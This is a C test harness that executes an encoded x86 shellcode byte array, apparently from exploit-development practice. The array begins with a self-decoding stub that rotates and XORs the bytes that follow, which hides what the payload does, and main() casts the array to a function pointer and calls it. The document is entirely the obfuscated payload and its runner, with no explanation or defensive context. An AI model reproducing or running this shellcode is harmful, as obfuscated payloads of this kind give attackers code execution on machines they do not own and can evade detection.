#include<stdio.h>
#include<string.h>

unsigned char shellcode[]  = \
"\xeb\x0f\x5e\x31\xc9\xb1\x19\xc0\x06\x02\x30\x0e\x46\xe2\xf8\xeb\x05\xe8\xec\xff\xff\xff\x0a\x36\xd1\x9f\x8e\xce\x18\x9e\x5e\xcf\x5b\xd9\xd8\x61\x3a\x96\x20\xba\x15\xe3\x39\x2d\x02\xf3\x60";

main()
{

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();

}

